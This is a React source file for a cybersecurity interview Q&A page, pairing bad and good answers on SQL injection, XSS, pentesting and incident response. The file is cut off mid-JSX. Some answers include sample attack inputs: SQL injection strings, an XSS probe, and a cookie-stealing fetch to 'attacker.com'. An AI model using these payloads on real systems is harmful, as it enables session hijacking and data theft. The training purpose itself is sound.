import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Alert, AlertDescription } from "@/components/ui/alert";
import {
    MessageSquare,
    CheckCircle2,
    XCircle,
    Lightbulb,
    TrendingUp,
    Target,
    Shield,
    Code,
    Network,
    Lock,
    Users,
    AlertTriangle,
    BookOpen
} from "lucide-react";

interface InterviewQuestion {
    id: string;
    category: "Technical" | "Behavioral" | "Scenario" | "Explaining Concepts";
    difficulty: "Junior" | "Mid-Level" | "Senior";
    question: string;
    badAnswer: string;
    badReasons: string[];
    goodAnswer: string;
    goodReasons: string[];
    tips: string[];
    relatedTopics: string[];
}

const interviewQuestions: InterviewQuestion[] = [
    // SQL Injection Questions
    {
        id: "sql-01",
        category: "Explaining Concepts",
        difficulty: "Junior",
        question: "Explain SQL injection to a non-technical person (CEO, manager, or your grandmother)",
        badAnswer: "SQL injection is when an attacker concatenates malicious SQL syntax into user input fields, exploiting insufficient input sanitization to execute arbitrary database commands.",
        badReasons: [
            "Uses technical jargon (concatenates, syntax, sanitization)",
            "Doesn't explain the actual impact",
            "Audience won't understand 'arbitrary database commands'",
            "No real-world analogy or context"
        ],
        goodAnswer: "Imagine you have a form asking 'What's your name?' You expect someone to type 'John', but an attacker types special commands that trick the system into doing more than just storing a name. It's like if someone gave extra instructions to a bank teller that made them withdraw money from everyone's accounts instead of just their own. SQL injection tricks databases into revealing or modifying data they shouldn't have access to. The fix is simple and free - it's like using a form with locked fields where you can only fill in actual names, not add extra commands.",
        goodReasons: [
            "Uses familiar analogy (bank teller)",
            "Explains impact in business terms (data theft, modification)",
            "No technical jargon, accessible language",
            "Mentions the fix is simple, reassuring to management",
            "Shows consequences they care about"
        ],
        tips: [
            "Always use analogies for non-technical audiences",
            "Focus on business impact, not technical details",
            "Keep it under 60 seconds",
            "End with a positive note about fixes being available"
        ],
        relatedTopics: ["SQL Injection", "Input Validation", "Prepared Statements"]
    },
    {
        id: "sql-02",
        category: "Technical",
        difficulty: "Junior",
        question: "How would you test a web application for SQL injection vulnerabilities?",
        badAnswer: "Run SQLMap",
        badReasons: [
            "Only mentions tools, not methodology",
            "Doesn't show understanding of the vulnerability",
            "No manual testing mentioned",
            "Doesn't follow professional pentesting workflow"
        ],
        goodAnswer: "I'd start with manual testing before automation. First, I'd insert a single quote (') in input fields to see if it triggers database errors - that indicates potential SQL injection. Then I'd test boolean-based injection with payloads like ' OR '1'='1 to see if I can manipulate query logic. I'd try comment syntax (--) to bypass parts of the query. If errors reveal database type, I'd tailor my approach. Once confirmed, I'd use SQLMap with appropriate flags like -u for the URL and --risk and --level parameters for deeper testing. Manual testing first ensures I understand the vulnerability mechanics, not just rely on tools. I'd document all findings with severity ratings and proof-of-concept screenshots.",
        goodReasons: [
            "Shows methodical approach (manual first, automated second)",
            "Demonstrates understanding of SQL injection types",
            "Mentions specific techniques and payloads",
            "Explains reasoning behind the approach",
            "Includes documentation and reporting",
            "Shows professional pentesting workflow"
        ],
        tips: [
            "Always mention manual testing before automation",
            "Explain your thought process, not just the steps",
            "Show knowledge of different injection types",
            "Mention documentation and responsible disclosure"
        ],
        relatedTopics: ["SQL Injection", "Manual Testing", "SQLMap", "Methodology"]
    },
    {
        id: "sql-03",
        category: "Scenario",
        difficulty: "Mid-Level",
        question: "You find SQL injection on a client's production website. Walk me through your next steps.",
        badAnswer: "Dump the database and show them all the customer data I extracted to prove it's serious.",
        badReasons: [
            "Unethical - exceeds authorized scope",
            "Could cause legal issues",
            "Damages trust with client",
            "Risks real customer data exposure",
            "No professional reporting process mentioned"
        ],
        goodAnswer: "First, I'd immediately stop testing and verify the vulnerability with a safe proof-of-concept - like extracting the database version or running a simple SELECT statement that doesn't touch actual customer data. I'd document the exact URL, parameters, HTTP request showing the vulnerability, and any database error messages. Then I'd report it to the client through proper channels (bug bounty portal or security@company email) with: 1) Executive summary explaining business risk in non-technical terms, 2) Technical details for their developers including exact payloads used, 3) CVSS severity score (likely 9.0+ for data exposure), 4) Remediation steps (use parameterized queries/prepared statements), 5) Estimated fix time (2-4 hours for a developer). I'd never exceed my authorized scope - ethical hacking means respecting boundaries even when you could go further. Finally, I'd offer to retest after they've patched.",
        goodReasons: [
            "Emphasizes ethical boundaries and authorization",
            "Uses safe PoC without touching real data",
            "Professional multi-stakeholder reporting",
            "Provides business context and technical details",
            "Offers constructive remediation guidance",
            "Shows maturity and trustworthiness"
        ],
        tips: [
            "ALWAYS stay within authorized scope",
            "Safe PoC only - never extract real customer data",
            "Report immediately, don't sit on critical vulns",
            "Provide both technical and business context",
            "Be constructive, not just critical"
        ],
        relatedTopics: ["Ethics", "Responsible Disclosure", "Reporting", "Authorization"]
    },

    // XSS Questions
    {
        id: "xss-01",
        category: "Explaining Concepts",
        difficulty: "Junior",
        question: "What is XSS and why is it dangerous? It's just an alert box, right?",
        badAnswer: "XSS stands for Cross-Site Scripting. It allows JavaScript execution in the browser. It can show alert boxes.",
        badReasons: [
            "Dismissive of severity ('just an alert box')",
            "Doesn't explain real-world impact",
            "No mention of what attackers actually do with XSS",
            "Lacks concrete examples"
        ],
        goodAnswer: "XSS is dangerous precisely because people think it's 'just an alert box.' The alert is proof-of-concept, but real attacks are much worse. Once an attacker can inject JavaScript, they can: 1) Steal session cookies and hijack your account (no password needed), 2) Capture everything you type including credit cards and passwords (keylogging), 3) Modify what you see on the page to phish credentials (fake login forms), 4) Use your browser to attack other users (self-propagating worm), 5) Mine cryptocurrency using your computer. In 2018, British Airways suffered an XSS attack that stole 380,000 credit cards, resulting in a £183 million fine. The alert box is like demonstrating you can unlock a door - the real question is what someone could steal once inside.",
        goodReasons: [
            "Addresses the misconception directly",
            "Lists specific attack scenarios",
            "Provides real-world breach example with costs",
            "Uses effective analogy (unlocking a door)",
            "Shows XSS leads to serious business impact"
        ],
        tips: [
            "Always counter the 'just an alert box' misconception",
            "List concrete attack scenarios",
            "Use recent breach examples",
            "Explain the attack chain (XSS → cookie theft → account takeover)"
        ],
        relatedTopics: ["XSS", "Session Hijacking", "Cookie Theft", "British Airways Breach"]
    },
    {
        id: "xss-02",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What's the difference between reflected, stored, and DOM-based XSS?",
        badAnswer: "Reflected is in the URL, stored is in the database, DOM is in JavaScript.",
        badReasons: [
            "Oversimplified and partially incorrect",
            "Doesn't explain impact differences",
            "No mention of persistence or severity",
            "Missing key exploitation details"
        ],
        goodAnswer: "Reflected XSS: The malicious script is reflected off the server in the response immediately. Attack requires tricking the victim into clicking a malicious link (e.g., via phishing). Not persistent - only affects that one user's session. Example: search?q=<script>alert(1)</script>. Severity: Medium (requires social engineering). Stored XSS: The malicious script is permanently stored on the server (database, forum post, comment). Every user who views that page executes the script - no social engineering needed. Most dangerous type. Example: forum comment with <script>fetch('attacker.com?cookie='+document.cookie)</script>. Severity: High/Critical (affects all users). DOM-Based XSS: Vulnerability is entirely client-side - the server isn't involved. JavaScript code processes user input without sanitization. Example: innerHTML=location.hash where attacker controls the hash. Detected by code review, not traditional scanners. Severity: Medium to High depending on exploitability.",
        goodReasons: [
            "Clear definitions with distinctions",
            "Explains severity and impact differences",
            "Provides concrete code examples",
            "Mentions exploitation requirements",
            "Notes detection methods"
        ],
        tips: [
            "Use the severity + social engineering angle to differentiate",
            "Stored XSS is always more severe (affects all users)",
            "Mention that DOM XSS needs code review to find",
            "Provide specific payload examples"
        ],
        relatedTopics: ["XSS Types", "Persistence", "Client-Side vs Server-Side"]
    },

    // Authentication & Authorization Questions
    {
        id: "auth-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What's the difference between authentication and authorization? Why does it matter?",
        badAnswer: "Authentication is login, authorization is permissions.",
        badReasons: [
            "Too brief, lacks depth",
            "Doesn't explain why distinction matters",
            "No security implications mentioned",
            "Missing real-world attack examples"
        ],
        goodAnswer: "Authentication answers 'Who are you?' - proving your identity (username/password, biometrics, MFA). Authorization answers 'What can you do?' - defining permissions after you're authenticated. The distinction matters because they're separate security controls that can fail independently. Broken authentication means attackers can impersonate users (credential stuffing, brute force, session hijacking). Broken authorization means authenticated users can access resources they shouldn't (IDOR, privilege escalation, missing access controls). Example: You're authenticated as a regular user (authentication works), but you can access admin functions by changing a URL parameter (authorization fails). The Facebook Cambridge Analytica scandal was broken authorization - authenticated apps accessed data beyond their permissions. Both are in OWASP Top 10: A01 (Broken Access Control/Authorization) and A07 (Authentication Failures).",
        goodReasons: [
            "Clear 'who vs what' framework",
            "Explains independent failure modes",
            "Provides specific attack examples for each",
            "Real-world breach context (Facebook)",
            "Links to OWASP Top 10 framework"
        ],
        tips: [
            "Use the 'Who vs What' framework",
            "Emphasize they fail independently",
            "Authentication bugs: credential attacks",
            "Authorization bugs: access control bypasses"
        ],
        relatedTopics: ["Authentication", "Authorization", "OWASP Top 10", "Access Control"]
    },
    {
        id: "auth-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "Design a secure authentication system for a banking application. What controls would you implement?",
        badAnswer: "Use bcrypt for passwords, add MFA, and use HTTPS.",
        badReasons: [
            "Too basic for a senior-level question",
            "Missing many critical components",
            "No mention of threat modeling",
            "Doesn't address session management, monitoring, or recovery flows"
        ],
        goodAnswer: "I'd design with defense-in-depth and assume breach: **1) Password Security**: Bcrypt/Argon2 with high work factors, minimum 12 chars, check against Have I Been Pwned database, prevent common passwords (top 10k list). **2) MFA**: TOTP (not SMS - SIM swapping risk), with backup codes securely stored. **3) Session Management**: Short-lived JWT access tokens (15 min), longer refresh tokens (httpOnly, secure, sameSite cookies), rotate on refresh, invalidate on logout. **4) Brute Force Protection**: Rate limiting (5 failed attempts = 15min lockout), progressive delays, CAPTCHA after 3 failures. **5) Monitoring**: Log all auth events, alert on: multiple failures, logins from new IPs/devices, concurrent sessions, unusual hours. **6) Account Recovery**: Security questions (3 minimum), email + SMS verification, time-delayed password resets (4-hour window before taking effect). **7) Device Fingerprinting**: Track known devices, require additional verification for new ones. **8) Secure Communication**: TLS 1.3 only, HSTS, certificate pinning for mobile apps. **9) Zero Trust**: Re-authenticate for sensitive operations (wire transfers), even mid-session. This layered approach means compromise of one control doesn't collapse the entire system.",
        goodReasons: [
            "Comprehensive, touches all critical areas",
            "Defense-in-depth philosophy stated upfront",
            "Specific technologies and parameters (not just buzzwords)",
            "Considers various attack vectors",
            "Monitoring and incident response included",
            "Demonstrates senior-level thinking"
        ],
        tips: [
            "Senior questions need comprehensive, architected answers",
            "Show defense-in-depth thinking",
            "Mention specific technologies and why",
            "Include monitoring/alerting - often forgotten",
            "Consider the entire lifecycle (registration, login, recovery, session)"
        ],
        relatedTopics: ["Authentication", "Authorization", "Defense in Depth", "Session Management"]
    },

    // Network Security Questions
    {
        id: "network-01",
        category: "Technical",
        difficulty: "Junior",
        question: "Explain what a port scan is and why attackers do it.",
        badAnswer: "Port scanning checks which ports are open on a system using tools like Nmap.",
        badReasons: [
            "Doesn't explain why ports matter",
            "No context about what attackers learn",
            "Missing the 'so what' factor",
            "Doesn't relate to attack lifecycle"
        ],
        goodAnswer: "Port scanning is like checking which doors and windows of a building are unlocked before attempting entry. Each port (0-65535) represents a service - port 22 is SSH, 80 is HTTP, 3306 is MySQL, etc. When attackers scan your network, they're asking: 'What services are running? What versions? Are there known vulnerabilities?' This is the reconnaissance phase before actual attacks. For example, finding port 22 open with an old SSH version might mean it's vulnerable to specific exploits. Finding port 3306 (MySQL) exposed to the internet is a critical misconfiguration - databases should be internal-only. Port scanning tells attackers your attack surface - every open port is a potential entry point. Defense: Use firewalls to close unnecessary ports, run services on non-standard ports (security by obscurity is weak but adds a layer), monitor for scan attempts (IDS/IPS), implement rate limiting.",
        goodReasons: [
            "Uses effective building analogy",
            "Explains what attackers learn from results",
            "Links to attack lifecycle (reconnaissance → exploitation)",
            "Provides specific port examples with context",
            "Includes defensive measures"
        ],
        tips: [
            "Connect scanning to the broader attack chain",
            "Mention specific ports and their services",
            "Explain what information is gained",
            "Include both offensive and defensive perspectives"
        ],
        relatedTopics: ["Port Scanning", "Reconnaissance", "Nmap", "Attack Surface"]
    },
    {
        id: "network-02",
        category: "Scenario",
        difficulty: "Mid-Level",
        question: "You're hired to pentest a company. Describe your methodology from start to finish.",
        badAnswer: "First I'd do reconnaissance, then vulnerability scanning, then exploitation, then write a report.",
        badReasons: [
            "Too vague and generic",
            "No specific techniques or tools mentioned",
            "Missing key phases (permission, post-exploitation)",
            "Doesn't show deep understanding of process"
        ],
        goodAnswer: "**Phase 0: Pre-Engagement**: Get signed authorization (Rules of Engagement), define scope (IP ranges, domains), testing windows, communication channels, emergency contacts. This protects me legally. **Phase 1: Reconnaissance**: Passive OSINT (Google dorking, Shodan, social media, WHOIS, LinkedIn for employee emails), Active scanning (Nmap for ports/services, subdomain enumeration, technology fingerprinting). Build attack surface map. **Phase 2: Vulnerability Assessment**: Automated scanning (Nessus, OpenVAS), manual testing for OWASP Top 10, check for default credentials, outdated software (CVE databases), misconfigurations. Prioritize by CVSS score. **Phase 3: Exploitation**: Prove vulnerabilities are real (PoC), gain initial access (Metasploit, custom exploits), document all steps with screenshots. **Phase 4: Post-Exploitation**: Privilege escalation (Linux: sudo, SUID; Windows: registry, services), lateral movement, persistence mechanisms (for continuous assessment), data discovery (don't exfiltrate - just document location). **Phase 5: Reporting**: Executive summary (business risk), technical details (every vuln with steps to reproduce), remediation prioritization (critical first), retest timeline. **Phase 6: Debrief**: Present findings, answer questions, support remediation efforts, retest after fixes.",
        goodReasons: [
            "Comprehensive 7-phase methodology",
            "Emphasizes legal authorization upfront",
            "Specific tools and techniques for each phase",
            "Distinguishes passive vs active reconnaissance",
            "Includes post-exploitation (often missed)",
            "Strong reporting and follow-up",
            "Shows professional maturity"
        ],
        tips: [
            "ALWAYS mention authorization/legal first",
            "Break methodology into clear phases",
            "Name specific tools and techniques",
            "Include reporting and retest",
            "Post-exploitation is often forgotten - mention it"
        ],
        relatedTopics: ["Pentesting Methodology", "Kill Chain", "Reconnaissance", "Reporting"]
    },

    // Blue Team / Defense Questions
    {
        id: "blue-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "How would you detect a SQL injection attack as a blue team defender?",
        badAnswer: "Look for SQL keywords in logs.",
        badReasons: [
            "Too simplistic",
            "Easily bypassed (encoding, obfuscation)",
            "No mention of SIEM, IDS, or detection tools",
            "Missing context about where to look"
        ],
        goodAnswer: "Multi-layered detection: **1) Web Application Firewall (WAF)**: Rules detecting SQL metacharacters (', --, UNION, SELECT) in requests, blocks and alerts. **2) SIEM Queries**: Splunk/ELK searching for: Database errors in web logs (500 errors with SQL syntax messages), Unusual query patterns (UNION SELECT, OR 1=1, time delays), High volume of queries from single IP, Query length anomalies (10x normal). **3) Database Activity Monitoring**: Alert on: Multiple failed queries from application, Queries accessing unusual tables, SELECT statements with no WHERE clause, Information_schema access attempts. **4) Application Logging**: Log all database queries with parameters, Monitor for escaped quotes or SQL keywords in user input. **5) Baseline Deviation**: ML models detecting query patterns that deviate from normal (e.g., suddenly accessing all user records). **6) Honeytokens**: Fake database fields that should never be accessed - if queried, it's an attack. Example SIEM query: `sourcetype=web_access (status=500 OR status=200) AND (sql_error=* OR body=\"*' OR*\" OR body=\"*UNION*\")`. The key is correlation - one indicator might be noise, but multiple indicators together = incident.",
        goodReasons: [
            "Defense-in-depth approach (multiple detection layers)",
            "Specific tools and technologies",
            "Concrete SIEM query example",
            "Mentions evasion techniques",
            "Includes proactive measures (honeytokens)",
            "Emphasizes correlation over single indicators"
        ],
        tips: [
            "Blue team questions need layered defense answers",
            "Mention specific tools (SIEM, WAF, IDS)",
            "Provide actual detection rules or queries",
            "Consider both signature-based and anomaly-based detection"
        ],
        relatedTopics: ["Blue Team", "SIEM", "WAF", "Detection Engineering"]
    },
    {
        id: "blue-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "Your SIEM alerts show 10,000 failed SSH login attempts from 50 IPs over the last hour. Walk me through your incident response process.",
        badAnswer: "Block all the IPs in the firewall.",
        badReasons: [
            "Knee-jerk reaction without analysis",
            "Doesn't follow IR framework",
            "No triage or investigation mentioned",
            "Could be blocking legitimate traffic",
            "Missing containment, eradication, recovery phases"
        ],
        goodAnswer: "**1) Initial Triage (5 min)**: Verify alert isn't false positive, check if any logins succeeded (failed attempts are expected, success = breach), identify targeted accounts (root? specific users?), check if IPs are known (Tor exits? VPN providers? Specific countries?). **2) Immediate Containment (if breach confirmed)**: If successful logins found: Invalidate all SSH sessions from those accounts, Reset compromised account passwords, Enable MFA if not already active. **3) Investigation (30 min)**: Analyze attack pattern: Distributed (botnet) or coordinated? Brute force (trying passwords) or credential stuffing (using leaked passwords)? Target: Production servers or all systems? Check logs for: What accounts were targeted most, Time-based patterns (sustained vs burst), Success/failure ratio (indicates password strength), Check compromised account's activity if breach occurred. **4) Tactical Response**: Temporary: Rate limit SSH (5 attempts = 15min ban per IP), Geo-block if attacks from specific countries, Enable CAPTCHA for SSH (fail2ban). Permanent: Enforce key-based auth (disable passwords), Change SSH port (obscurity, not security), Implement jump boxes for internal access. **5) Threat Hunting**: Search for: Lateral movement attempts, New user accounts created, Privilege escalation attempts, Data exfiltration (large outbound transfers). **6) Documentation**: Timeline, IOCs (IP addresses, user agents), Actions taken, Lessons learned. **7) Post-Incident**: Update runbooks, Tune SIEM rules (threshold too sensitive?), Train team on findings. Key insight: 10k failed attempts are noise - focus on successful logins. Attackers expect 99.9% failure rate in brute force.",
        goodReasons: [
            "Follows NIST IR framework (Triage → Contain → Investigate → Eradicate → Recover → Lessons Learned)",
            "Prioritizes correctly (successful logins, not failed attempts)",
            "Distinguishes tactical vs strategic response",
            "Includes threat hunting beyond initial alert",
            "Documentation and continuous improvement",
            "Realistic timelines provided",
            "Shows senior-level incident response maturity"
        ],
        tips: [
            "Senior questions require structured IR frameworks",
            "Triage FIRST - don't jump to conclusions",
            "Successful logins >> failed attempts in severity",
            "Include threat hunting and documentation",
            "Mention lessons learned and prevention"
        ],
        relatedTopics: ["Incident Response", "SIEM", "Brute Force Attacks", "SSH Security"]
    },

    // Behavioral Questions
    {
        id: "behavioral-01",
        category: "Behavioral",
        difficulty: "Mid-Level",
        question: "Describe a time you found a critical vulnerability. How did you handle it?",
        badAnswer: "I found SQL injection on a client site and immediately reported it. They fixed it.",
        badReasons: [
            "Too brief, no storytelling",
            "Doesn't show problem-solving process",
            "Missing the STAR method (Situation, Task, Action, Result)",
            "No lessons learned or growth demonstrated"
        ],
        goodAnswer: "**Situation**: During a bug bounty assessment of a financial platform, I was testing the account settings page when I noticed the user_id parameter wasn't properly validated. **Task**: My goal was to determine if this was a simple display issue or a critical security flaw that could expose other users' data. **Action**: I tested by incrementing the user_id parameter from 1001 (my account) to 1002. The page loaded successfully, displaying another user's full name, email, account balance, and recent transactions - clear IDOR vulnerability with PII exposure. Instead of continuing to test (which would risk legal issues and violate responsible disclosure), I immediately: 1) Documented the exact steps with sanitized screenshots (blurred sensitive data), 2) Assessed severity (CVSS 8.5 - High: unauthorized access to financial data), 3) Checked if it was already reported in their bug bounty program, 4) Submitted through official channels with: PoC video, business impact analysis (GDPR violation, potential for account takeover if combined with session hijacking), remediation steps (implement server-side authorization checks, user session validation). **Result**: The company acknowledged within 2 hours (weekend, but they had on-call security), patched within 8 hours, paid $5,000 bounty, and invited me to their private program. **Lessons Learned**: 1) Even simple parameter tampering can lead to critical vulnerabilities, 2) Clear communication with business impact gets faster response, 3) Ethical boundaries matter - I could have extracted more data but didn't. This experience taught me that responsible disclosure builds long-term relationships more valuable than quick payouts.",
        goodReasons: [
            "Follows STAR framework (Situation-Task-Action-Result)",
            "Shows technical skill (IDOR identification)",
            "Demonstrates ethical boundaries and responsible disclosure",
            "Quantifiable outcome ($5k bounty, 8hr fix time)",
            "Includes lessons learned (shows growth mindset)",
            "Business impact communication",
            "Tells a story, memorable for interviewer"
        ],
        tips: [
            "Use STAR method for all behavioral questions",
            "Emphasize ethical behavior and boundaries",
            "Include specific technical details",
            "Quantify results (dollars, time, users impacted)",
            "Always end with lessons learned"
        ],
        relatedTopics: ["IDOR", "Responsible Disclosure", "Bug Bounty", "Ethics"]
    },
    {
        id: "behavioral-02",
        category: "Behavioral",
        difficulty: "Senior",
        question: "Tell me about a time you made a mistake that impacted a project or client. How did you handle it?",
        badAnswer: "I accidentally deleted some data during testing, but I restored it from backup so no big deal.",
        badReasons: [
            "Downplays severity ('no big deal')",
            "Doesn't show accountability or ownership",
            "Missing lessons learned and process improvements",
            "No mention of communication with stakeholders"
        ],
        goodAnswer: "**Situation**: I was conducting a penetration test for an e-commerce client, focused on payment processing vulnerabilities. **Mistake**: While testing SQL injection on a product search feature, I used an aggressive automated scan without properly reviewing the payloads. One payload triggered a race condition that locked the production database, taking down the site for 14 minutes during peak shopping hours (6pm Friday). **Immediate Response**: 1) Immediately stopped all testing, 2) Notified the client's technical lead and my project manager within 60 seconds, 3) Offered to help their DBA troubleshoot (they declined - had it handled), 4) Documented exactly which payload caused the issue. **Accountability**: I took full responsibility in a call with their CTO and my director. No excuses about tool behavior - I should have reviewed every payload before running automated scans. I estimated they lost approximately $15k in sales during that window. **Remediation**: 1) Created incident timeline and root cause analysis, 2) Implemented new policy: Review all automated scan configurations, Run scans on staging first (when available), Use rate limiting on aggressive tests, Have client's technical team on standby before intensive testing. **Result**: Client was frustrated but appreciated transparency and immediate notification. They completed the engagement and hired us again 6 months later specifically because 'you owned the mistake and fixed your process.' I now train junior pentesters on this incident as a case study. **Lessons Learned**: Automation is powerful but dangerous - human oversight is mandatory. Trust is built through how you handle failures, not just successes. Communication speed during incidents matters more than technical skill.",
        goodReasons: [
            "Shows genuine vulnerability and accountability",
            "Quantifies impact honestly ($15k loss)",
            "Immediate action and stakeholder communication",
            "Process improvements implemented (not just apologizing)",
            "Long-term relationship salvaged through transparency",
            "Uses failure as teaching opportunity",
            "Demonstrates senior-level maturity and growth"
        ],
        tips: [
            "Don't pick trivial mistakes - show real stakes",
            "Own it completely, no excuses or blame-shifting",
            "Focus on what you learned and how you improved",
            "Show how the mistake made you better",
            "Senior candidates MUST show they learn from failures"
        ],
        relatedTopics: ["Professional Growth", "Accountability", "Risk Management", "Process Improvement"]
    },

    // Career & Industry Questions
    {
        id: "career-01",
        category: "Behavioral",
        difficulty: "Junior",
        question: "How do you stay updated on new vulnerabilities and security research?",
        badAnswer: "I read Twitter and watch YouTube videos.",
        badReasons: [
            "Too vague and passive",
            "No specific sources or structured approach",
            "Doesn't show dedicated effort",
            "Missing hands-on practice element"
        ],
        goodAnswer: "I use a multi-source approach: **Daily** (15 min): Twitter security researchers I follow (@orange_8361 for web vulnerabilities, @LiveOverflow for reverse engineering, @GossiTheDog for threat intel), HackerNews for discussions, Reddit r/netsec for community posts. **Weekly** (1 hour): CVE databases (NIST NVD filtered by critical/high), Security newsletters (tl;dr sec, Krebs on Security), HackerOne/Bugcrowd disclosed reports (learn from others' findings), GitHub security advisories for frameworks I use. **Monthly** (4 hours): DEF CON/Black Hat talk recordings (focus on tools and techniques), Security conference publications, Read research papers on specific interests (currently web app security). **Continuous Hands-On**: HackTheBox weekly challenges (maintain Hacker rank), TryHackMe for structured learning paths, Replicate new exploits in home lab to understand mechanics, Contribute to OWASP projects. **Knowledge Management**: Obsidian notes with tags for quick reference, Personal vulnerability database with PoCs, Blog posts to reinforce learning (Feynman technique). This isn't just consumption - I actively practice and document. When Log4Shell dropped, I had a vulnerable test environment running within 2 hours because I maintain a practice infrastructure.",
        goodReasons: [
            "Structured and specific approach",
            "Named sources and researchers",
            "Mix of passive (reading) and active (hands-on) learning",
            "Shows dedication with time commitments",
            "Knowledge management system mentioned",
            "Real example (Log4Shell) showing application",
            "Continuous improvement mindset"
        ],
        tips: [
            "Name specific sources and people you follow",
            "Show both learning and practicing",
            "Mention a knowledge management system",
            "Give time commitments to show seriousness",
            "Include recent example of applying new knowledge"
        ],
        relatedTopics: ["Continuous Learning", "Security Research", "CVEs", "Community Engagement"]
    }
];

const InterviewPrep = () => {
    const [selectedCategory, setSelectedCategory] = useState<string>("All");
    const [selectedDifficulty, setSelectedDifficulty] = useState<string>("All");
    const [expandedQuestionId, setExpandedQuestionId] = useState<string | null>(null);

    const categories = ["All", "Technical", "Behavioral", "Scenario", "Explaining Concepts"];
    const difficulties = ["All", "Junior", "Mid-Level", "Senior"];

    const filteredQuestions = interviewQuestions.filter(q => {
        const matchesCategory = selectedCategory === "All" || q.category === selectedCategory;
        const matchesDifficulty = selectedDifficulty === "All" || q.difficulty === selectedDifficulty;
        return matchesCategory && matchesDifficulty;
    });

    const getDifficultyColor = (difficulty: string) => {
        switch (difficulty) {
            case "Junior":
                return "bg-green-100 text-green-800 border-green-200 dark:bg-green-950 dark:text-green-200";
            case "Mid-Level":
                return "bg-yellow-100 text-yellow-800 border-yellow-200 dark:bg-yellow-950 dark:text-yellow-200";
            case "Senior":
                return "bg-red-100 text-red-800 border-red-200 dark:bg-red-950 dark:text-red-200";
            default:
                return "bg-gray-100 text-gray-800 border-gray-200";
        }
    };

    const getCategoryIcon = (category: string) => {
        switch (category) {
            case "Technical": return Code;
            case "Behavioral": return Users;
            case "Scenario": return Target;
            case "Explaining Concepts": return MessageSquare;
            default: return BookOpen;
        }
    };

    return (
        <div className="container mx-auto py-8 space-y-6">
            {/* Header */}
            <div>
                <div className="flex items-center gap-3 mb-2">
                    <MessageSquare className="h-8 w-8 text-primary" />
                    <h1 className="text-4xl font-bold">Interview Q&A Bank</h1>
                </div>
                <p className="text-muted-foreground text-lg">
                    Master cybersecurity interviews with good vs bad answer examples
                </p>
            </div>

            {/* Stats */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                <Card>
                    <CardHeader className="pb-3">
                        <CardDescription>Total Questions</CardDescription>
                        <CardTitle className="text-3xl">{interviewQuestions.length}</CardTitle>
                    </CardHeader>
                </Card>
                <Card>
                    <CardHeader className="pb-3">
                        <CardDescription>Technical</CardDescription>
                        <CardTitle className="text-3xl text-blue-600">
                            {interviewQuestions.filter(q => q.category === "Technical").length}
                        </CardTitle>
                    </CardHeader>
                </Card>
                <Card>
                    <CardHeader className="pb-3">
                        <CardDescription>Behavioral</CardDescription>
                        <CardTitle className="text-3xl text-purple-600">
                            {interviewQuestions.filter(q => q.category === "Behavioral").length}
                        </CardTitle>
                    </CardHeader>
                </Card>
                <Card>
                    <CardHeader className="pb-3">
                        <CardDescription>Scenario</CardDescription>
                        <CardTitle className="text-3xl text-orange-600">
                            {interviewQuestions.filter(q => q.category === "Scenario").length}
                        </CardTitle>
                    </CardHeader>
                </Card>
            </div>

            {/* Filters */}
            <Card>
                <CardHeader>
                    <CardTitle>Filter Questions</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                    <div>
                        <span className="text-sm font-medium mb-2 block">Category</span>
                        <div className="flex flex-wrap gap-2">
                            {categories.map((category) => (
                                <Button
                                    key={category}
                                    variant={selectedCategory === category ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => setSelectedCategory(category)}
                                >
                                    {category}
                                </Button>
                            ))}
                        </div>
                    </div>
                    <div>
                        <span className="text-sm font-medium mb-2 block">Experience Level</span>
                        <div className="flex flex-wrap gap-2">
                            {difficulties.map((difficulty) => (
                                <Button
                                    key={difficulty}
                                    variant={selectedDifficulty === difficulty ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => setSelectedDifficulty(difficulty)}
                                >
                                    {difficulty}
                                </Button>
                            ))}
                        </div>
                    </div>
                    <div className="text-sm text-muted-foreground">
                        Showing {filteredQuestions.length} questions
                    </div>
                </CardContent>
            </Card>

            {/* Questions List */}
            <div className="space-y-4">
                {filteredQuestions.map((question) => {
                    const Icon = getCategoryIcon(question.category);
                    const isExpanded = expandedQuestionId === question.id;

                    return (
                        <Card key={question.id} className="hover:shadow-lg transition-shadow">
                            <CardHeader>
                                <div className="flex items-start justify-between gap-4">
                                    <div className="flex-1">
                                        <div className="flex items-center gap-2 mb-2">
                                            <Badge className={getDifficultyColor(question.difficulty)}>
                                                {question.difficulty}
                                            </Badge>
                                            <Badge variant="outline">
                                                <Icon className="h-3 w-3 mr-1" />
                                                {question.category}
                                            </Badge>
                                        </div>
                                        <CardTitle className="text-lg">{question.question}</CardTitle>
                                    </div>
                                    <Button
                                        variant="ghost"
                                        size="sm"
                                        onClick={() => setExpandedQuestionId(isExpanded ? null : question.id)}
                                    >
                                        {isExpanded ? "Hide Answer" : "Show Answer"}
                                    </Button>
                                </div>
                            </CardHeader>

                            {isExpanded && (
                                <CardContent className="space-y-6">
                                    {/* Bad Answer */}
                                    <div className="space-y-3">
                                        <div className="flex items-center gap-2">
                                            <XCircle className="h-5 w-5 text-red-600" />
                                            <h4 className="font-semibold text-lg">❌ Bad Answer</h4>
                                        </div>
                                        <Alert className="bg-red-50 dark:bg-red-950/20 border-red-200 dark:border-red-900">
                                            <AlertDescription className="text-sm">
                                                "{question.badAnswer}"
                                            </AlertDescription>
                                        </Alert>
                                        <div className="space-y-2">
                                            <span className="text-sm font-medium text-red-800 dark:text-red-200">Why this answer fails:</span>
                                            <ul className="space-y-1">
                                                {question.badReasons.map((reason, idx) => (
                                                    <li key={idx} className="flex items-start gap-2 text-sm text-red-700 dark:text-red-300">
                                                        <XCircle className="h-4 w-4 mt-0.5 flex-shrink-0" />
                                                        <span>{reason}</span>
                                                    </li>
                                                ))}
                                            </ul>
                                        </div>
                                    </div>

                                    {/* Good Answer */}
                                    <div className="space-y-3">
                                        <div className="flex items-center gap-2">
                                            <CheckCircle2 className="h-5 w-5 text-green-600" />
